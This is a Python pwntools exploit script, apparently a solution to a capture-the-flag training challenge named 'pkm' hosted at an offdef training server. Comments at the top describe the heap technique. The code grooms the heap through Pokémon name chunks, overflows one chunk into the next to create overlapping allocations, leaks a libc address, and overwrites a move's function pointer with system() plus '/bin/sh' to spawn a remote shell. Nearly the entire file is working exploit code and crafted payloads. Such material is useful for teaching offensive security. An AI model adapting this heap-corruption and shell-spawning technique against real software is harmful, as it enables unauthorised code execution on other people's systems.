# The exploit works similar as in null byte slides but my chunks are the names of the chunks since they are the only
# dynamic blocks where the size can be chosen (otherwise new PKM have always the size of 0x100 bytes).
# First I create the correct layout in order to have the strings next to each other. My B2 block is a PKM I create because
# the scope is to write a move (that are set to 0 at the creation of the pkm) that opens a shell. Overwrting B2 with the name of
# pkm A is possible after I did the exploit as explained in the slides. One gadgets don't work since contraints are not
# respected. But trying with system, I noticed that the string inside system(...) was in a position where I can write (initially it corresponded to
# the '(' character of the name of the move of B2). So I overwrited it writing in that position /bin/sh and it works.

from pwn import *

context.arch = 'amd64'

LIBC_BASE_OFFSET = 520064
ONE_GADGET_OFFSET = 0x1053d1 #magic gadgets don't work
SYSTEM_OFFSET = 321008

def add_PKM(p):
    p.sendline(b"0")
    p.recvuntil(b"> ")

def rename_PKM(p, index: int, length: int, name):
    p.sendline(b"1")
    p.recvuntil(b"> ")
    p.sendline(str(index))
    p.recvuntil(b"insert length:")
    p.sendline(str(length))
    p.send(name)
    p.recvuntil(b"> ")

def kill_PKM(p, index:int):
    p.sendline(b"2")
    p.recvuntil(b"> ")
    p.sendline(str(index))
    p.recvuntil(b"> ")

def fight_PKM(p, index:int, move:int, defender: int):
    p.sendline(b"3")
    p.recvuntil(b"> ")
    p.sendline(str(index))
    p.recvuntil(b"> ")
    p.sendline(str(move))
    p.recvuntil(b"> ")
    p.sendline(str(defender))

def info_PKM(p, index: int):
    p.sendline(b"4")
    p.recvuntil(b"> ")
    p.sendline(str(index))
    p.recvuntil(b" *Name: ")
    time.sleep(0.1)
    leaked_addr = p.read(6)
    time.sleep(0.1)
    p.recvuntil(b"> ")
    return leaked_addr

def exit(p):
    p.sendline(b"5")

#p = process("./pkm_nopie_patched")
p = remote ("bin.training.offdef.it", 2025)

"""gdb.attach(p, '''
    b 0x0401c27
''')
input("wait")"""

add_PKM(p) #0
add_PKM(p) #1
add_PKM(p) #2
add_PKM(p) #3
add_PKM(p) #4
rename_PKM(p, 0, 512, "A"*512) # --> A
rename_PKM(p, 1, 512, "B"*496 + "\x11\x01" + "\x00"*14) # --> B
rename_PKM(p, 2, 512, "C"*512) # --> C
kill_PKM(p, 1) #here I kill B and its name string
add_PKM(p) #1 to replace the empty slot where pkm b was before (otherwise the string is put there)
rename_PKM(p, 0, 520, "D"*520) # A overflows into B
rename_PKM(p, 3, 240, "E"*240) # Creation of B1
add_PKM(p) #5 --> B2
kill_PKM(p, 3) #kill B1
kill_PKM(p, 2) #Kill C
add_PKM(p) #2 to replace the slot of pkm C
add_PKM(p) #3 to replace the slot of pkm B1(3)
payload = "Z"*768 + "\x00\x01\x00\x00\x00\x00\x00\x00" + "\x00\x01\x00\x00\x00\x00\x00\x00" + "\x28" + "\x00"*7 + "\x3F" + "\x00"*7 + "\x64" + "\x00"*7 + "\x64" + "\x00"*7 + "\x00"*8 + "\x20\x40\x40" + "\x00"*5 + "\x05" + "\x00"*39 + "\x2F\x20\x40" + "\x00"*5 + "\xB6\x11\x40" + "\x00"*5 + "\x00"*8 + "\x91\x03" + "\x00"*5
rename_PKM(p, 0, 903, payload) # write inside B2 especially the moves
leaked_addr = info_PKM(p, 5)
leaked_addr = u64(leaked_addr.ljust(8, b"\x00"))
one_gadget_addr = leaked_addr - LIBC_BASE_OFFSET + SYSTEM_OFFSET
one_gadget_addr = p64(one_gadget_addr)
print(leaked_addr)
payload = b"Z"*768 + b"\x00\x01\x00\x00\x00\x00\x00\x00"*2 + b"/bin/sh\x00" + b"\x3F" + b"\x00"*7 + b"\x64" + b"\x00"*7 + b"\x64" + b"\x00"*7 + b"\x00"*8 + b"\x20\x40\x40" + b"\x00"*5 + b"\x05" + b"\x00"*39 + b"\x2F\x20\x40" + b"\x00"*5 + one_gadget_addr + b"\x00"*144
rename_PKM(p, 0, 1032, payload)
fight_PKM(p, 5, 0, 2)

p.interactive()